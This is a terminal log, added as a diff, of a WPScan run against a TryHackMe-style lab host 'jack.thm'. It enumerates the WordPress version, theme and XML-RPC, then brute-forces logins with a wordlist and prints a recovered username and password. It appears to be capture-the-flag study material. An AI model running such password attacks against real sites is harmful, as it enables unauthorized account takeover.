@@ -1,0 +1,108 @@
+burtreynolds@burtreynolds:~/tryhackme/jack$ wpscan --url http://jack.thm/ -t 3 -P /usr/share/wordlists/fasttrack.txt \-U users.txt
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.4
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://jack.thm/ [10.10.159.86]
+[+] Started: Sun Jul 26 23:38:56 2020
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://jack.thm/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] http://jack.thm/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
+ |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
+
+[+] WordPress theme in use: online-portfolio
+ | Location: http://jack.thm/wp-content/themes/online-portfolio/
+ | Last Updated: 2020-01-17T00:00:00.000Z
+ | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
+ | [!] The version is out of date, the latest version is 0.0.8
+ | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
+ | Style Name: Online Portfolio
+ | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
+ | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
+ | Author: Ample Themes
+ | Author URI: https://amplethemes.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 0.0.7 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 <==============================================================================================================================================================> (21 / 21) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 3 user/s
+[SUCCESS] - wendy / changelater                                                                                                                                                                                                            
+Trying danny / starwars Time: 00:01:40 <======================================================================================================================                                          > (648 / 871) 74.39%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: wendy, Password: changelater
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Sun Jul 26 23:40:41 2020
+[+] Requests Done: 673
+[+] Cached Requests: 34
+[+] Data Sent: 319.573 KB
+[+] Data Received: 418.604 KB
+[+] Memory used: 210.82 MB
+[+] Elapsed time: 00:01:45
+
